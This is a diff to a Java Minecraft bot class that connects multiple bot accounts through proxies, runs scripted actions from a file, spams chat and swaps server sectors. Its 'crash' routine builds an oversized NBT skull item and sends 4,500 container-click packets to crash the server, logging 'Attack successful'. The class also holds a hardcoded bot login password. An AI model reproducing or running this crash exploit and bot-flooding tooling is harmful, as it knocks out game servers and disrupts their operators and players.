@@ -4,46 +4,41 @@ import com.github.steveice10.mc.protocol.MinecraftProtocol;
 import com.github.steveice10.mc.protocol.data.game.entity.metadata.Position;
 import com.github.steveice10.mc.protocol.data.game.entity.object.Direction;
 import com.github.steveice10.mc.protocol.data.game.entity.player.Hand;
-import com.github.steveice10.mc.protocol.packet.ingame.clientbound.ClientboundKeepAlivePacket;
+import com.github.steveice10.mc.protocol.data.game.entity.player.PlayerAction;
+import com.github.steveice10.mc.protocol.data.game.inventory.ClickItemAction;
+import com.github.steveice10.mc.protocol.data.game.inventory.ContainerActionType;
+import com.github.steveice10.mc.protocol.data.game.entity.metadata.ItemStack;
 import com.github.steveice10.mc.protocol.packet.ingame.clientbound.ClientboundLoginPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.player.ClientboundPlayerPositionPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundChatPacket;
-import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundKeepAlivePacket;
+import com.github.steveice10.mc.protocol.packet.ingame.serverbound.inventory.ServerboundContainerClickPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.level.ServerboundAcceptTeleportationPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.*;
+import com.github.steveice10.opennbt.tag.builtin.CompoundTag;
+import com.github.steveice10.opennbt.tag.builtin.ListTag;
+import com.github.steveice10.opennbt.tag.builtin.StringTag;
 import com.github.steveice10.packetlib.ProxyInfo;
 import com.github.steveice10.packetlib.Session;
 import com.github.steveice10.packetlib.event.session.DisconnectedEvent;
 import com.github.steveice10.packetlib.event.session.SessionAdapter;
 import com.github.steveice10.packetlib.packet.Packet;
 import com.github.steveice10.packetlib.tcp.TcpClientSession;
-import com.github.steveice10.mc.protocol.packet.ingame.serverbound.inventory.ServerboundContainerClickPacket;
-import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundPlayerActionPacket;
-import com.github.steveice10.mc.protocol.data.game.entity.player.PlayerAction;
-import com.github.steveice10.mc.protocol.data.game.inventory.ContainerActionType;
-import com.github.steveice10.mc.protocol.data.game.entity.metadata.ItemStack;
-import com.github.steveice10.mc.protocol.data.game.inventory.ClickItemAction;
-import com.github.steveice10.opennbt.tag.builtin.CompoundTag;
-import com.github.steveice10.opennbt.tag.builtin.StringTag;
-import com.github.steveice10.opennbt.tag.builtin.ListTag;
-
-import java.net.InetSocketAddress;
-import java.util.concurrent.*;
-import java.util.UUID;
-import java.util.HashMap;
-import java.util.Arrays;
 import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
+
 import java.io.BufferedReader;
+import java.io.FileReader;
 import java.io.IOException;
-import java.io.InputStream;
-import java.io.InputStreamReader;
+import java.net.InetSocketAddress;
 import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.HashMap;
 import java.util.List;
+import java.util.UUID;
+import java.util.concurrent.*;
 
 public class Bot extends Thread {
 
-    MinecraftProtocol protocol = null;
-
+    private MinecraftProtocol protocol = null;
     private int botId;
     private String nickname;
     private ProxyInfo proxy;
@@ -52,17 +47,23 @@ public class Bot extends Thread {
     private boolean hasMainListener;
     private boolean LimboConnected = false;
     private double lastX, lastY, lastZ = -1;
+    private String actionsFilePath;
+    private ScheduledExecutorService sectorSwapExecutor;
+    private final ExecutorService scriptExecutor = Executors.newSingleThreadExecutor();
 
+    private int ServerLoop = 5;
+
+    private volatile int currentSwapSector = 1;
     private ScheduledExecutorService botHeadroll;
-    private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
 
     private boolean connected;
 
-    public Bot(int botId, String nickname, InetSocketAddress address, ProxyInfo proxy) {
+    public Bot(int botId, String nickname, InetSocketAddress address, ProxyInfo proxy, String actionsFilePath) {
         this.botId = botId;
         this.nickname = nickname;
         this.address = address;
         this.proxy = proxy;
+        this.actionsFilePath = actionsFilePath;
 
         Log.info("Creating bot", nickname, " [#" + botId + "]");
         protocol = new MinecraftProtocol(nickname);
@@ -71,38 +72,22 @@ public class Bot extends Thread {
 
     @Override
     public void run() {
-
         if (!Main.isMinimal()) {
             client.addListener(new SessionAdapter() {
-
                 @Override
                 public void packetReceived(Session session, Packet packet) {
-
                     if (packet instanceof ClientboundLoginPacket) {
                         connected = true;
                         if (!LimboConnected) {
                             LimboConnected = true;
                             Log.info(nickname + " Connected to server! [#" + botId + "]");
-
-                            ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
-                            scheduler.schedule(() -> {
-                                Log.info(nickname + " Connected! [#" + botId + "]");
-                                executeScriptFromFile("files/actions.txt");
-                            }, 1, TimeUnit.SECONDS);
+                            scriptExecutor.submit(Bot.this::executeScriptFromFile);
                         }
-                    }
-                    else if (packet instanceof ClientboundKeepAlivePacket) {
-                        ClientboundKeepAlivePacket keepAlive = (ClientboundKeepAlivePacket) packet;
-                        long id = keepAlive.getPingId();
-                        long now = System.currentTimeMillis();
-                        client.send(new ServerboundKeepAlivePacket(id)); // Kinda bugged
                     } else if (packet instanceof ClientboundPlayerPositionPacket) {
                         ClientboundPlayerPositionPacket p = (ClientboundPlayerPositionPacket) packet;
-
                         lastX = p.getX();
                         lastY = p.getY();
                         lastZ = p.getZ();
-
                         client.send(new ServerboundAcceptTeleportationPacket(p.getTeleportId()));
                     }
                 }
@@ -113,19 +98,21 @@ public class Bot extends Thread {
                     Log.info();
                     Log.info(nickname + " disconnected");
                     Log.info(" -> " + event.getReason());
-                    if(event.getCause() != null) {
+                    if (event.getCause() != null) {
                         event.getCause().printStackTrace();
                     }
                     Log.info();
+
+                    if (botHeadroll != null) botHeadroll.shutdownNow();
+                    scriptExecutor.shutdownNow();
+
                     Main.removeBot(Bot.this);
                     Thread.currentThread().interrupt();
                 }
             });
         }
+
         client.connect();
-        if (client.isConnected()) {
-            client.disconnect("Bot stopped.");
-        }
     }
 
     public int getBotId() {
@@ -169,16 +156,18 @@ public class Bot extends Thread {
     }
     public void clickSlot(int slot, int container) {
         if (!connected) return;
-
-        try {
-            client.send(new ServerboundContainerClickPacket(
-                    container, 0, slot,
-                    ContainerActionType.CLICK_ITEM,
-                    ClickItemAction.LEFT_CLICK,
-                    null,
-                    new Int2ObjectOpenHashMap<>()
-            ));
-        } catch (Exception ignored) {}
+        client.send(new ServerboundContainerClickPacket(
+                container, 0, slot,
+                ContainerActionType.CLICK_ITEM,
+                ClickItemAction.LEFT_CLICK,
+                null,
+                new Int2ObjectOpenHashMap<>()
+        ));
+    }
+    public void clickSlotInAllContainers(int slot) {
+        for (int containerId = 0; containerId <= 3; containerId++) {
+            clickSlot(slot, containerId);
+        }
     }
 
     public void sendChat(String text) {
@@ -186,52 +175,47 @@ public class Bot extends Thread {
     }
 
     public void changeSector(int channel, String type, int container) {
-        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
-
-        scheduler.schedule(() -> {
-            if (type.equals("sector")) {
-                sendChat("/ch");
-            } else {
-                sendChat("/afk");
+        scriptExecutor.submit(() -> {
+            try {
+                if (type.equals("sector")) {
+                    sendChat("/ch");
+                } else {
+                    sendChat("/afk");
+                }
+                Thread.sleep(1000);
+                int chann2 = channel+1;
+                Log.info("Bot #" + this.botId + " Clicked GUI Slot " + chann2);
+                clickSlotInAllContainers(chann2);
+                Thread.sleep(2000);
+                for (int i = 0; i < 3; i++) {
+                    move(0, -0.5, 0);
+                    Thread.sleep(500);
+                }
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
             }
-            scheduler.schedule(() -> {
-                Log.info("Clicked in GUI");
-                clickSlot(channel-1, container);
-                scheduler.schedule(() -> {
-                    for (int i = 0; i < 3; i++) { // 0.5 block down (3 times)
-                        long delay = 500 * (i + 9);
-                        scheduler.schedule(() -> {move(0, -0.5, 0); }, delay, TimeUnit.MILLISECONDS);
-                    }
-                }, 2, TimeUnit.SECONDS); // Sector move time
-            }, 1, TimeUnit.SECONDS);
-        }, 1, TimeUnit.SECONDS);
+        });
     }
 
     public void dropHotbarItems() {
         Log.info("Starting to drop hotbar items for " + nickname);
-        dropItemFromSlot(0);
-    }
-
-    private void dropItemFromSlot(int slot) {
-        if (slot > 8) {
-            Log.info("Finished dropping items for " + nickname);
-            return;
-        }
-
-        client.send(new ServerboundSetCarriedItemPacket(slot));
-
-        scheduler.schedule(() -> {
-            client.send(new ServerboundPlayerActionPacket(
-                    PlayerAction.DROP_ITEM_STACK,
-                    new Position(0, 0, 0),
-                    Direction.DOWN
-            ));
-
-            scheduler.schedule(() -> {
-                dropItemFromSlot(slot + 1);
-            }, 50, TimeUnit.MILLISECONDS);
-
-        }, 50, TimeUnit.MILLISECONDS);
+        scriptExecutor.submit(() -> {
+            for (int slot = 0; slot <= 8; slot++) {
+                if (!client.isConnected()) break;
+                try {
+                    client.send(new ServerboundSetCarriedItemPacket(slot));
+                    Thread.sleep(50);
+                    client.send(new ServerboundPlayerActionPacket(PlayerAction.DROP_ITEM_STACK, new Position(0, 0, 0), Direction.DOWN));
+                    Thread.sleep(50);
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                    break;
+                }
+            }
+            if (client.isConnected()) {
+                Log.info("Finished dropping items for " + nickname);
+            }
+        });
     }
 
     public String getNickname() {
@@ -294,16 +278,49 @@ public class Bot extends Thread {
                 double nextZ = startZ + stepZ * i;
 
                 client.send(new ServerboundMovePlayerPosPacket(true, nextX, nextY, nextZ));
-
                 try {
-                    scheduler.schedule(() -> {}, 50, TimeUnit.MILLISECONDS).get();
-                } catch (InterruptedException | ExecutionException e) {
-                    break;
+                    Thread.sleep(50);
+                } catch (InterruptedException e) {
+                    throw new RuntimeException(e);
                 }
             }
         }).start();
     }
 
+    public void startSectorSwapping() {
+        if (sectorSwapExecutor != null && !sectorSwapExecutor.isShutdown()) {
+            Log.info("Sector swapping is already running for " + nickname);
+            return;
+        }
+
+        sectorSwapExecutor = Executors.newSingleThreadScheduledExecutor();
+        currentSwapSector = 1;
+
+        Log.info("Starting automatic sector swapping for bot #" + botId);
+
+        sectorSwapExecutor.scheduleAtFixedRate(() -> {
+            if (!client.isConnected()) {
+                sectorSwapExecutor.shutdown();
+                return;
+            }
+
+            Log.info("Bot #" + botId + " (" + nickname + ") swapping to sector " + currentSwapSector);
+            changeSector(currentSwapSector, "sector", 0);
+
+            currentSwapSector++;
+            if (currentSwapSector > ServerLoop) {
+                currentSwapSector = 1;
+            }
+        }, 0, 20, TimeUnit.SECONDS);
+    }
+
+    public void stopSectorSwapping() {
+        if (sectorSwapExecutor != null && !sectorSwapExecutor.isShutdown()) {
+            Log.info("Stopping automatic sector swapping for bot #" + botId);
+            sectorSwapExecutor.shutdownNow();
+            sectorSwapExecutor = null;
+        }
+    }
 
     public void autoLogin() {
         sendChat("/login XqBots!@3");
@@ -313,30 +330,18 @@ public class Bot extends Thread {
     }
 
     public void startSendingPackets() {
-        int packets = 4500;
-        int size = 39000;
-        int length = 10;
-        String type = "empty";
-
         Log.info("Starting crash with " + nickname);
-
-        ItemStack itemStack = this.getSkullStack(size, length, type);
-
-        for (int i = 0; i < packets; ++i) {
-            ServerboundContainerClickPacket clickPacket = new ServerboundContainerClickPacket(
-                    0,
-                    0,
-                    20,
-                    ContainerActionType.CLICK_ITEM,
-                    ClickItemAction.LEFT_CLICK,
-                    itemStack,
-                    new HashMap<Integer, ItemStack>()
-            );
-
-            client.send(clickPacket);
-        }
-
-        Log.info("Attack successful, finished sending packets!");
+        scriptExecutor.submit(() -> {
+            ItemStack itemStack = this.getSkullStack(39000, 10, "empty");
+            for (int i = 0; i < 4500; ++i) {
+                if (!client.isConnected()) break;
+                ServerboundContainerClickPacket clickPacket = new ServerboundContainerClickPacket(0, 0, 20, ContainerActionType.CLICK_ITEM, ClickItemAction.LEFT_CLICK, itemStack, new HashMap<>());
+                client.send(clickPacket);
+            }
+            if (client.isConnected()) {
+                Log.info("Attack successful, finished sending packets!");
+            }
+        });
     }
 
 
@@ -387,93 +392,86 @@ public class Bot extends Thread {
         return sb.toString();
     }
 
-    public void executeScriptFromFile(String resourcePath) {
-        new Thread(() -> {
-            Log.info("Starting to execute script from resource: " + resourcePath, nickname);
+    public void executeScriptFromFile() {
+        if (actionsFilePath == null || actionsFilePath.trim().isEmpty()) {
+            return;
+        }
 
-            ClassLoader classLoader = Bot.class.getClassLoader();
-            InputStream inputStream = classLoader.getResourceAsStream(resourcePath);
+        Log.info("Starting to execute script from file: " + actionsFilePath, nickname);
+        try (BufferedReader reader = new BufferedReader(new FileReader(actionsFilePath))) {
+            List<String> lines = new ArrayList<>();
+            reader.lines().forEach(lines::add);
 
-            if (inputStream == null) {
-                Log.error("Resource not found: " + resourcePath);
-                return;
-            }
+            for (int i = 0; i < lines.size(); i++) {
+                String line = lines.get(i);
 
-            try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
-                List<String> lines = new ArrayList<>();
-                reader.lines().forEach(lines::add);
+                if (line.contains("#")) {
+                    line = line.split("#", 2)[0];
+                }
+                String trimmedLine = line.trim();
 
-                for (int i = 0; i < lines.size(); i++) {
-                    String line = lines.get(i);
+                if (trimmedLine.isEmpty()) {
+                    continue;
+                }
 
-                    if (line.contains("#")) {
-                        line = line.split("#", 2)[0];
+                if (trimmedLine.startsWith("[loop") && trimmedLine.endsWith("]:")) {
+                    String[] parts = trimmedLine.substring(1, trimmedLine.length() - 2).split(" ");
+                    if (parts.length < 2) {
+                        Log.error("Invalid loop syntax: " + trimmedLine);
+                        continue;
                     }
-                    String trimmedLine = line.trim();
-
-                    if (trimmedLine.isEmpty()) {
+                    int loopCount;
+                    try {
+                        loopCount = Integer.parseInt(parts[1]);
+                    } catch (NumberFormatException e) {
+                        Log.error("Invalid loop count in: " + trimmedLine);
                         continue;
                     }
 
-                    if (trimmedLine.startsWith("[loop") && trimmedLine.endsWith("]:")) {
-                        String[] parts = trimmedLine.substring(1, trimmedLine.length() - 2).split(" ");
-                        if (parts.length < 2) {
-                            Log.error("Invalid loop syntax: " + trimmedLine);
-                            continue;
-                        }
-                        int loopCount;
-                        try {
-                            loopCount = Integer.parseInt(parts[1]);
-                        } catch (NumberFormatException e) {
-                            Log.error("Invalid loop count in: " + trimmedLine);
-                            continue;
-                        }
+                    List<String> loopBody = new ArrayList<>();
+                    int baseIndentation = getIndentation(line);
+                    int bodyIndentation = -1;
+                    i++;
 
-                        List<String> loopBody = new ArrayList<>();
-                        int baseIndentation = getIndentation(line);
-                        int bodyIndentation = -1;
-                        i++;
-
-                        while (i < lines.size()) {
-                            String loopLine = lines.get(i);
-                            int currentIndentation = getIndentation(loopLine);
-                            if (bodyIndentation == -1) {
-                                if (currentIndentation > baseIndentation && !loopLine.trim().isEmpty()) {
-                                    bodyIndentation = currentIndentation;
-                                } else {
-                                    i--;
-                                    break;
-                                }
-                            }
-                            if (currentIndentation >= bodyIndentation) {
-                                loopBody.add(loopLine);
-                                i++;
+                    while (i < lines.size()) {
+                        String loopLine = lines.get(i);
+                        int currentIndentation = getIndentation(loopLine);
+                        if (bodyIndentation == -1) {
+                            if (currentIndentation > baseIndentation && !loopLine.trim().isEmpty()) {
+                                bodyIndentation = currentIndentation;
                             } else {
                                 i--;
                                 break;
                             }
                         }
-                        Log.info("Executing loop " + loopCount + " times...", nickname);
-                        for (int j = 0; j < loopCount; j++) {
-                            Log.info("Loop iteration " + (j + 1) + "/" + loopCount, nickname);
-                            for (String commandInLoop : loopBody) {
-                                processCommand(commandInLoop);
-                            }
+                        if (currentIndentation >= bodyIndentation) {
+                            loopBody.add(loopLine);
+                            i++;
+                        } else {
+                            i--;
+                            break;
                         }
-                        Log.info("Loop finished.", nickname);
-
-                    } else {
-                        processCommand(line);
                     }
+                    Log.info("Executing loop " + loopCount + " times...", nickname);
+                    for (int j = 0; j < loopCount; j++) {
+                        Log.info("Loop iteration " + (j + 1) + "/" + loopCount, nickname);
+                        for (String commandInLoop : loopBody) {
+                            processCommand(commandInLoop);
+                        }
+                    }
+                    Log.info("Loop finished.", nickname);
+
+                } else {
+                    processCommand(line);
                 }
-                Log.info("Script finished successfully!", nickname);
-            } catch (IOException e) {
-                Log.info("Could not read script resource: " + resourcePath, e.getMessage());
-            } catch (InterruptedException e) {
-                Log.info("Script execution was interrupted.", nickname);
-                Thread.currentThread().interrupt();
             }
-        }).start();
+            Log.info("Script finished successfully!", nickname);
+        } catch (IOException e) {
+            Log.error("Could not read script file: " + actionsFilePath + ". Error: " + e.getMessage());
+        } catch (InterruptedException e) {
+            Log.info("Script execution was interrupted.", nickname);
+            Thread.currentThread().interrupt();
+        }
     }
     private void processCommand(String rawLine) throws InterruptedException {
         if (rawLine == null) return;
@@ -496,8 +494,13 @@ public class Bot extends Thread {
 
         try {
             switch (command) {
+                case "swap":
+                    Log.info("Starting sector swapping from script for " + nickname);
+                    Main.setAutoSwapState(true);
+                    startSectorSwapping();
+                    break;
                 case "wait":
-                    if (parts.length > 1) Thread.sleep(Integer.parseInt(parts[1]));
+                    if (parts.length > 1) Thread.sleep(Long.parseLong(parts[1]));
                     break;
                 case "goto":
                     if (parts.length > 3) moveSmoothlyTo(Double.parseDouble(parts[1]), Double.parseDouble(parts[2]), Double.parseDouble(parts[3]));
@@ -554,11 +557,25 @@ public class Bot extends Thread {
                 case "register":
                     autoRegister();
                     break;
+                case "ascii":
+                    List<String> messagesToUse;
+                    if (parts.length > 1) {
+                        String filePath = String.join(" ", Arrays.copyOfRange(parts, 1, parts.length));
+                        messagesToUse = Main.loadMessagesFromFile(filePath);
+                    } else {
+                        Log.info("No file path provided in script, using default ASCII messages.");
+                        messagesToUse = Arrays.asList("a", "s", "c", "i", "i");
+                    }
+
+                    if (messagesToUse != null && !messagesToUse.isEmpty()) {
+                        Main.triggerAsciiSequence(messagesToUse);
+                    }
+                    break;
                 case "crash":
                     startSendingPackets();
                     break;
                 case "gui":
-                    if (parts.length > 2) clickSlot(Integer.parseInt(parts[1]), Integer.parseInt(parts[2]));
+                    if (parts.length > 1) clickSlotInAllContainers(Integer.parseInt(parts[1]));
                     break;
                 case "chat":
                     if (parts.length > 1) sendChat(String.join(" ", Arrays.copyOfRange(parts, 1, parts.length)));
